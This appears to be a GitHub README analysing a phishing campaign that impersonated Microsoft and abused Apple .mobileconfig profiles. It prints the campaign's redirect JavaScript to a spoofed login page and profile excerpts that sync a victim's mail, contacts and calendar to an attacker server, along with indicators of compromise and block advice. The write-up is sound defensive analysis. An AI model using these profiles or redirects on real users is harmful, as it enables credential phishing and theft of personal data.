# Phishing-apple-mobileconfig-breakdown
Analysis of a phishing campaign using Apple .mobileconfig profiles for email, contacts, and calendar exfiltration.

## Background

This repository was created using the files and information from a phishing email I personally received.  
I regularly analyze phishing attempts I encounter, both out of curiosity and to stay aware of evolving techniques. In this case, while the email itself was part of a typical mass phishing campaign and used fairly standard methods, I chose to document it here as a **learning resource** for others.  
The campaign leverages Apple `.mobileconfig` profiles which may be useful for those studying mobile or configuration-based threats.

**Don't open the `.mobileconfig` files on an iPhone**
The phishing site is likely down by the time I post this but it may still attempt installing profiles on your phone.

---


![82628182](https://github.com/user-attachments/assets/d2108cb0-d1e9-4708-a62b-8f1186df4aba)




## Summary

This repository documents a phishing campaign observed in May 2025 that targets Apple device users by abusing `.mobileconfig` files — a lesser-known but legitimate configuration mechanism used on iOS and macOS systems. The campaign delivers three malicious configuration profiles via email, each designed to silently configure the victim’s device for data exfiltration.

Once installed, these profiles automatically connect the victim's device to attacker-controlled infrastructure by:
- Adding a **malicious IMAP/SMTP email account**
- Syncing the device's **contacts** via CardDAV
- Accessing the user's **calendar** via CalDAV

All payloads are disguised as part of a “Secure Setup” and reference domains that appear vaguely professional (e.g., `eu40.1host.gr`). While the phishing email itself was generic and mass-distributed.

---

## Key Findings

- Delivered via phishing email impersonating Microsoft  
- `.mobileconfig` profiles install silently on iOS/macOS devices  
- Targets:
  - **Mail** (`com.apple.mail.managed`)
  - **Contacts** (`com.apple.carddav.account`)
  - **Calendar** (`com.apple.caldav.account`)
- Backend controlled by attacker at `mail.blutr.gr`  
- SSL misconfiguration (port 2080) used to avoid detection  
- Redirection script used to fake legitimacy and lure users to spoofed login page  

---

## Email Payload Overview

**Sender (spoofed):**
```
info.mail.mr@mi-robotic.com
```

**Observed Subject:**
```
Microsoft Secure Document Access
```

**Malicious Attachments:**
- `email-gdgraphic.mobileconfig`
- `carddav-gdgraphic.mobileconfig`
- `caldav-gdgraphic.mobileconfig`

---

## Redirection JavaScript

This JavaScript is embedded in a fake Billing Details button:

```javascript
setTimeout(() => {
  document.getElementById("loader").style.display = 'block';
  document.getElementById("success").style.display = 'block';
}, 100);

setTimeout(() => {
  window.location.href = "https://live.microsoft.outh.sso.50-6-202-90.cprapid.com/?Xkjvaksk121asIghlasdqwe";
}, 1000);
```

### Purpose:
- Displays a fake success/loading screen
- The portion of the url "https://live.microsoft.outh.sso." is added to make the link seem legitimate.
- Redirects to their phishing site impersonating Microsoft’s login page. 
- Uses `cprapid.com` webhosting company where the attacker is hosting their landing page.

---

## `.mobileconfig` Payloads Breakdown

### 1. Mail Account Configuration

```xml
<key>PayloadType</key>
<string>com.apple.mail.managed</string>
<key>EmailAddress</key>
<string>blutrgr@eu40.1host.gr</string>
<key>IncomingMailServerHostName</key>
<string>mail.blutr.gr</string>
<key>IncomingMailServerPortNumber</key>
<integer>993</integer>
<key>OutgoingMailServerPortNumber</key>
<integer>465</integer>
```

- Configures Apple Mail with IMAP/SMTP  
- SSL used on standard ports (993/465)  
- Server controlled by attacker  
- Enables attacker to monitor or send mail from the device  

---

### 2. CardDAV (Contacts)

```xml
<key>PayloadType</key>
<string>com.apple.carddav.account</string>
<key>CardDAVHostName</key>
<string>mail.blutr.gr:2080</string>
```

- Syncs the user’s address book with the attacker’s server  
- Port 2080 is suspicious — not standard for SSL or CardDAV  
- Can exfiltrate names, phone numbers, and email addresses  

---

### 3. CalDAV (Calendar)

```xml
<key>PayloadType</key>
<string>com.apple.caldav.account</string>
<key>CalDAVHostName</key>
<string>mail.blutr.gr</string>
<key>CalDAVPort</key>
<integer>2080</integer>
```

- Syncs user calendar to attacker infrastructure  
- May enable the injection of malicious or misleading events  

---

## Indicators of Compromise (IOCs)

| Type            | Value                                                  |
|-----------------|--------------------------------------------------------|
| Email           | `blutrgr@eu40.1host.gr`                                |
| Hostname        | `mail.blutr.gr`                                        |
| Fake MS login   | `live.microsoft.outh.sso.50-6-202-90.cprapid.com`      |
| Ports           | 993, 465, **2080**                                     |
| File Types      | `.mobileconfig`                                        |
| Payload Types   | `com.apple.mail.managed`, `com.apple.carddav.account`, `com.apple.caldav.account` |

---

## Mitigation and Detection

### For Individuals:
- Never install `.mobileconfig` files unless provided by verified IT personnel  
- On iOS: **Settings > General > VPN & Device Management**  
- On macOS: **System Settings > Profiles**

### For Organizations:
- Block `.mobileconfig` attachments at email gateway  
- Monitor or block outbound traffic to:
  - `mail.blutr.gr`
  - `*.1host.gr`
  - `*.cprapid.com` (especially from Apple devices)
- Disable unmanaged profile installation via MDM policies  
- Watch for CardDAV/CalDAV traffic over non-standard ports (e.g. 2080)

---

## Conclusion

This campaign demonstrates a clever and low-interaction method of data exfiltration using trusted Apple device features. By leveraging `.mobileconfig` profiles, attackers bypass traditional phishing detection and gain persistent access to sensitive information.

### This repository contains:
- Sample redacted profiles for reference (`.mobileconfig` file's)
- Indicators of compromise.
- Write-up to raise awareness of configuration profile abuse.
   


